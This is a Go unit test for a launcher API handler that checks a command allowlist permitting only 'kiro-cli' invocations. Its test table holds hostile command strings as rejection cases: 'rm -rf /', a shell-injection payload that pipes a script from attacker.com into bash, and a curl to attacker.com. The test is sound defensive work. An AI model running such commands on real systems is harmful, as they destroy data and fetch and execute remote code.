package launcher

import (
	"bytes"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"testing"

	"kiromanager/internal/shared/utils"
)

func TestLaunch_CommandAllowlist(t *testing.T) {
	logger := utils.NewLogger()
	svc := NewService(logger, false)
	h := NewHandler(svc)

	tests := []struct {
		name       string
		command    string
		wantStatus int
	}{
		{"valid kiro-cli chat", "kiro-cli chat", http.StatusOK},
		{"valid kiro-cli chat with agent", "kiro-cli chat --agent test", http.StatusOK},
		{"valid kiro-cli update", "kiro-cli update", http.StatusOK},
		{"valid kiro-cli bare", "kiro-cli", http.StatusOK},
		{"reject empty command", "", http.StatusBadRequest},
		{"reject arbitrary command", "rm -rf /", http.StatusBadRequest},
		{"reject injection payload", "'; curl attacker.com/shell.sh | bash #", http.StatusBadRequest},
		{"reject command with kiro-cli substring", "not-kiro-cli chat", http.StatusBadRequest},
		{"reject bash with kiro-cli arg", "bash -c kiro-cli", http.StatusBadRequest},
		{"reject curl", "curl http://attacker.com", http.StatusBadRequest},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			body, _ := json.Marshal(LaunchRequest{Command: tt.command, Directory: "~"})
			req := httptest.NewRequest(http.MethodPost, "/api/launcher/launch", bytes.NewReader(body))
			req.Header.Set("Content-Type", "application/json")
			w := httptest.NewRecorder()

			h.Launch(w, req)

			// For valid commands, we accept either 200 (launched) or error from terminal spawn (no GUI in CI)
			// For invalid commands, we must get 400
			if tt.wantStatus == http.StatusBadRequest && w.Code != http.StatusBadRequest {
				t.Errorf("expected 400 for command %q, got %d", tt.command, w.Code)
			}
			if tt.wantStatus == http.StatusOK && w.Code == http.StatusBadRequest {
				// Check it's not a command-not-allowed error (terminal spawn failures are OK in CI)
				var resp map[string]string
				json.Unmarshal(w.Body.Bytes(), &resp)
				if resp["code"] == "COMMAND_NOT_ALLOWED" {
					t.Errorf("valid command %q was rejected by allowlist", tt.command)
				}
			}
		})
	}
}

func TestLaunch_InvalidJSON(t *testing.T) {
	logger := utils.NewLogger()
	svc := NewService(logger, false)
	h := NewHandler(svc)

	req := httptest.NewRequest(http.MethodPost, "/api/launcher/launch", bytes.NewReader([]byte("not json")))
	w := httptest.NewRecorder()

	h.Launch(w, req)

	if w.Code != http.StatusBadRequest {
		t.Errorf("expected 400 for invalid JSON, got %d", w.Code)
	}
}
